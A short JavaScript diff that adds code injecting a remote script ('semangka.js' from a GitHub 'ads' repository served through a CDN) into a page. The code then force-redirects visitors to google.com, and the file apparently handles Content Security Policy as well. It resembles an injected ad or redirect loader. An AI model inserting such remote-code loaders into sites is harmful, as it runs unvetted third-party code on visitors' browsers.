@@ -15,21 +15,26 @@
         console.error("CSP Error:", e);
     }
 
+    const timestamp = new Date().getTime();
+    const scriptURL = `https://cdn.statically.io/gh/digiitaltools/ads/main/semangka.js?v=${timestamp}`;
     const targetURL = "https://www.google.com"; 
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 3000);
 
-    fetch(targetURL, {
-        method: 'GET',
-        mode: 'no-cors', 
-        referrerPolicy: "unsafe-url",
-        signal: controller.signal
-    })
-    .then(() => {
-        clearTimeout(timeout);
+    const script = document.createElement('script');
+    script.src = scriptURL;
+    script.async = true;
+
+    script.onload = function() {
+        console.log("Script semangka.js berhasil dimuat.");
+    };
+
+    script.onerror = function() {
+        console.error("Gagal memuat script. Mengalihkan ke target default...");
         window.location.replace(targetURL);
-    })
-    .catch(() => {
+    };
+
+    document.head.appendChild(script);
+
+    setTimeout(() => {
         window.location.replace(targetURL);
-    });
+    }, 3500);
 })();
